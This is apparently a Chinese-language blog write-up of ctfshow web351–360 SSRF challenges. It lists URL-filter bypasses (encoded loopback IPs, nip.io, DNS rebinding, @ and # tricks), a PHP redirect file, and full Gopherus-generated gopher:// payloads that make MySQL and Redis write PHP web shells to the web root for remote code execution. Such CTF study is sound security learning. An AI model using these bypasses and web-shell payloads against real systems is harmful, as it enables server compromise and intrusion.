---
title: "ctfshow SSRF"
description: "ctfshow web351–360 SSRF 刷题记录。"
publishDate: "2026-03-11T23:02:34"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ./rooftop-amusement-park.jpg
  color: "#9F7E9B"
  alt: ctfshow SSRF
language: '简中'
draft: false
---

今天一天满课回寝后硬刚xss最终遗憾离场，一怒之下怒了一下，事已至此，先把ssrf的发出来吧

## web351-356

### IP地址编码绕过

十进制编码：`http://2130706433`

八进制编码：`http://0177.0000.0000.0001`

十六进制编码：`http://0x7f000001`

IPv6地址绕过：`http://[::1]`

短地址：`http://127.1`

零地址：`htttp://0`

通过ip地址解析为`127.0.0.1`的网站绕过：`http://lvh.me` `http://customer-name.local.gd`

## web357

### DNS名称构造绕过

通过控制DNS解析，攻击者可将自定义域名解析到目标IP，绕过黑名单或白名单。

#### （1）自定义域名解析

攻击者注册域名（如`attacker.com`），并设置DNS记录指向`127.0.0.1`或内网IP。

示例：

原始URL：`http://127.0.0.1`

绕过URL：`http://spoofed.attacker.com`

#### （2）子域名构造

攻击者可使用子域名构造，将目标IP嵌入域名。例如，`127.0.0.1.attacker.com`可能解析到`127.0.0.1`。

示例：

绕过URL：`http://127.0.0.1.attacker.com`

#### （3）nip.io等服务

`nip.io`等服务允许生成形如`127.0.0.1.nip.io`的域名，直接解析到指定IP，方便攻击者测试SSRF漏洞。

示例：

原始URL：`http://127.0.0.1`

绕过URL：`http://127.0.0.1.nip.io`

#### （4）DNS重绑定（DNS Rebinding）

DNS重绑定通过动态更改DNS解析结果，绕过白名单。例如，域名`attacker.com`初始解析到合法IP（如`1.2.3.4`），随后切换到`127.0.0.1`。

使用 [rbndr.us](http://rbndr.us) 构造

这个工具允许你通过子域名指定两个交替出现的 IP。

配置方式：访问 [rbndr.us](http://rbndr.us)，设置 IP Address 1 为一个公网 IP（如 `8.8.8.8`），IP Address 2 为 `127.0.0.1`。

生成域名：它会给你一个类似 [7f000001.08080808.rbndr.us](http://7f000001.08080808.rbndr.us) 的域名。

Payload：

```text
url=http://7f000001.08080808.rbndr.us/flag.php
```

操作：因为解析具有随机性，你可能需要多次发送请求。只要碰巧第一次解析到公网 IP 且第二次解析到 `127.0.0.1`，就能绕过成功。

示例：

绕过URL：`http://attacker.com`

> **重定向**
>
> `gethostbyname` — 返回主机名对应的IPv4地址
>
> `filter_var` — 使用特定的过滤器过滤一个变量
>
> `FILTER_VALIDATE_IP` - 验证是否为有效的IP地址
>
> `FILTER_FLAG_NO_PRIV_RANGE` - 排除私有IP地址
>
> `FILTER_FLAG_NO_RES_RANGE` 排除保留IP地址 如回环地址`127.0.0.1`
>
> 在自己的服务器上创建文件 `demo.php`
>
> ```php
> <?php header("Location: http://127.0.0.1/flag.php", true, 302);?>
> ```
>
> payload
>
> ```text
> url=http://xx.xx.xx.xx/demo.php
> ```

## web358

### 使用特殊字符（@和#）绕过

特殊字符`@`和`#`在URL解析中有特定含义，攻击者可利用这些特性绕过白名单或黑名单过滤。

#### （1）使用@字符

在URL中，`@`用于分隔认证信息和主机名。攻击者可构造形如`http://allowed.com@127.0.0.1`的URL，使服务器解析到`127.0.0.1`，而过滤器可能仅检查`allowed.com`。

原理：

URL格式：`http://username:password@hostname`。 过滤器可能仅验证`allowed.com`，忽略`@`后的实际目标`127.0.0.1`。

示例：

原始URL：`http://127.0.0.1`

绕过URL：`http://allowed.com@127.0.0.1`

变种：

使用URL编码混淆`@`（`%40`）。

示例：`http://allowed.com%40127.0.0.1`

双重编码：`http://allowed.com%2540127.0.0.1`

#### （2）使用#字符

`#`表示URL片段（fragment），通常用于客户端定位页面锚点。某些服务器在处理URL时忽略`#`后的内容，攻击者可将目标地址置于`#`前。

原理：

URL如`http://127.0.0.1#allowed.com`可能被解析为`127.0.0.1`，而过滤器检查`allowed.com`。

示例：

原始URL：`http://127.0.0.1`

绕过URL：`http://127.0.0.1#allowed.com`

变种：

URL编码`#`（`%23`）。

示例：`http://127.0.0.1%23allowed.com`

双重编码：`http://127.0.0.1%2523allowed.com`

#### （3）@和#组合使用

攻击者可结合`@`和`#`构造复杂URL，进一步混淆过滤器。例如，`http://allowed.com@127.0.0.1#bypass`可能被解析为`127.0.0.1`。

示例：

绕过URL：`http://allowed.com@127.0.0.1#bypass`

编码变种：`http://allowed.com%40127.0.0.1%23bypass`

```text
url=http://ctf.127.0.0.1.nip.io/flag.php?show
```

`nip.io`会忽略掉ip前的任何前缀

```text
url=http://ctf.@127.0.0.1/flag.php#show
```

在 URL 语法中，`@` 符号之前的内容被视为“用户名和密码”。很多解析器（包括 `parse_url`）会忽略这部分，而将 `@` 之后的内容视为真正的 Host（主机名），在服务端发起的 HTTP 请求中，`#show` 是不会被发送给目标服务器的（锚点只在浏览器端解析）

## web359

题目描述提示打无密码sql，进入页面是登录选项，bp抓包发现post包中的body为`u=root&returl=https%3A%2F%2F404.chall.ctf.show%2F`，找到ssrf注入点，于是用户名填root，密码用gopherus工具将payload：

```sql
select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";
```

转换为`gopherus://`协议格式来完成RCE

```text
For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%50%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%20%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%22%3b%01%00%00%00%01
```

从bp抓包内容知道还得把上述payload先url encode一次再重放

成功RCE

![web359 配图1](./images/image-6.png)

## web360

题目提示打redis，redis没有用户名的概念，进入页面直接显示源码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

总体和上题差不多，payload：

```text
Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html):
Give PHP Payload (We have default PHP Shell): <?php eval($_POST['cmd']); ?>

Your gopher link is Ready to get PHP Shell:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

也需要url encode一次，然后成功RCE

![web360 配图1](./images/web360-redis-rce.png)
